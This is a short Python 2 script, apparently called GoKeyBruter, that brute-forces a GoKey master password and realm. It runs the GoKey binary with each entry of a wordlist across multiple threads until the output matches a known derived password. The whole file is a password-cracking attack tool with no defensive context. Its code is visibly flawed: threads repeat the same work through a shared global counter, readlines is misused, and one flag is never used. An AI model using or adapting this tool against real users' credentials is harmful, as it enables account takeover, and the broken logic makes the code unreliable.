import threading
import subprocess
import argparse

counter = 0

def brute_realm(args, password):
	password = password.strip()
	with open(args.realm_list) as realm_list:
		for r in realm_list:
			r = r.strip()
			if(args.v):
				print "[*] Trying  [%s:%s] "  % (r,password,)

			output = run_process(args.g, r, password)
			if(output.strip() == args.p):
				print "[+] Found the master password! [%s:%s]" % (password.strip(), r) 
				return output
	return ''


def run_process(go_bin, realm, password):
	output = subprocess.check_output([go_bin, "-r", realm, "-p", password.strip()])
	return output.strip()

def generate_table(args, realm):
	
	global counter
	
	counter = 0
	cracked = False
	master_password = ''
	file = open(args.w, 'r')
	line = file.readlines(counter)
	
	while cracked == False and counter < len(line)-1:
		counter = counter + 1
		
		if(counter % 10000 == 0):
			print "[+] %d checked." % (counter)

		if(args.brute_realm):
			output = brute_realm(args, line[counter].strip())
		else:
			output = run_process(args.g, realm, line[counter].strip()).strip()
			if(output == args.p):
				master_password	= output
				print "[+] Found the master password! [%s:%s]" % (output, realm.strip()) 
				cracked = True
				break
		
	return master_password



def main():

	parser = argparse.ArgumentParser(description='Arguments for GoKeyBruter')
	parser.add_argument('-g', required=True, help='The GoKey Binary Location')
	parser.add_argument('-r', help='The GoKey "Realm"')
	parser.add_argument('-p', help='The GoKey Plaintext Password')
	parser.add_argument('-v', help='Set Verbosity On/Off')
	parser.add_argument('-w', required=True, help='Custom wordlist (Currently Required)')
	parser.add_argument('-t', type=int, required=True, help='Threads')

	parser.add_argument('--brute-realm', help='Attempt to Brute Force the Realm')
	parser.add_argument('--realm-list', help='Attempt to Brute Force the Realm')
	parser.add_argument('--master-password', help='If the --brute-realm flag is set you can use this flag to just brute the realm if you already know the Master Password but need the Realm')

	arguments = parser.parse_args()

	realm = ''
	if arguments.r:
		realm = arguments.r
	else:
		if arguments.brute_realm:
			realm = arguments.realm_list

	for x in range(arguments.t):
		threading.Thread(name='Thread-{}'.format(x), target=generate_table, args=(arguments,realm,)).start()

if __name__ == '__main__':
	main()